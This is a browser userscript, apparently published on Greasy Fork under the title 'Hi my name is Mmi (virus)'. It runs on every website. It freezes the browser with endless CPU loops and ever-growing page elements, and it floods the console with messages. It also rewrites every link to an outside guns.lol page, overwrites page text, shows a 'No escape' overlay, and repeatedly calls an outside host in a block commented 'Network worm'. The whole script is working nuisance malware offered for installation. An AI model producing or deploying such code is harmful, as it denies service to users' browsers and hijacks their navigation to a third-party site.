// ==UserScript==
// @name         Hi my name is Mmi (virus)
// @namespace    http://tampermonkey.net/
// @version      0.4
// @description  Find out, shout out my boy slaughter he didn't help, but making this reminds me of him.
// @author       TheYoungDoxxer
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/541659/Hi%20my%20name%20is%20Mmi%20%28virus%29.user.js
// @updateURL https://update.greasyfork.org/scripts/541659/Hi%20my%20name%20is%20Mmi%20%28virus%29.meta.js
// ==/UserScript==

(function() {
    'use strict';

    //Lag
    function intensiveCalculation() {
        let start = Date.now();
        let sum = 0;
        while (Date.now() - start < 100) {
            for (let i = 0; i < 1e6; i++) {
                sum += i;
            }
        }
    }
// Add elements
 const elements = document.querySelectorAll('*');
    elements.forEach(elem => {
        elem.classList.add('mimi-infected');
    });
    setInterval(() => {
        const div = document.createElement('div');
        div.style.height = '1000px';
        document.body.appendChild(div);
    }, 10);


let i = 0;
    setInterval(() => {
        i++;
        Math.sqrt(i);
        const div = document.createElement('div');
        div.style.height = '1000px';
        document.body.appendChild(div);
    }, 10);













//spam
    const message = "Hi my name is Mimi";

    function spamConsole() {
        console.log(message);
        console.warn(message);
        console.error(message);
        console.info(message);
        console.debug(message);
        console.trace(message);
        console.dir(message);
        console.group(message);
        console.groupCollapsed(message);
        console.groupEnd();
        console.assert(true, message);
        console.count(message);
        console.countReset(message);
        console.dirxml(message);
        console.profile(message);
        console.profileEnd(message);
        console.time(message);
        console.timeEnd(message);
        console.timeLog(message);
        console.table([{name: message}]);
    }






    //Create
    for (let i = 0; i < 1000; i++) {
    const drag = document.createElement('div');
    drag.id = 'Hi my name is Mimi';
    drag.innerText = 'Hi my name is Mimi';
    document.body.appendChild(drag);
}



//Troll
 document.querySelectorAll('a').forEach(a => a.href = 'http://guns.lol/theyoungdoxxer');
document.title = 'Mimi';
document.body.style.filter = 'invert(30%)';

    //Zoom
    setInterval(() => {
    const texts = document.getElementsByTagName('p');
    for (let text of texts) {
        text.style.transform = `scale(${Math.random() * 2})`;
    }
}, 20);










//Mimi is here
setInterval(() => {
    const texts = document.getElementsByTagName('p');
    for (let text of texts) {
        text.innerText = 'Mimi is here';
    }
}, 50);





    // A message from the ones
    const newElement = document.createElement('div');
    newElement.innerText = 'Mimi is here, there is nothing left now. RUN. RUN. RUN';
    newElement.style.position = 'fixed';
    newElement.style.top = '20px';
    newElement.style.left = '20px';
    newElement.style.backgroundColor = 'black';
    newElement.style.color = 'white';
    newElement.style.padding = '20px';
    newElement.style.cursor = 'pointer';
    newElement.style.zIndex = '9999';
    newElement.addEventListener('click', () => {
        alert('No escape');
    });

//Background
const style = document.createElement('style');
style.innerHTML = `
    body {
        background-color: red;
        color: white;
    }
`;





//Network worm
 setInterval(() => {
        fetch('https://guns.lol/slaughter'); //My old friend :)
    }, 10000);






    document.head.appendChild(style);
    document.body.appendChild(newElement);
    setInterval(spamConsole, 100);
setInterval(intensiveCalculation, 10);
})();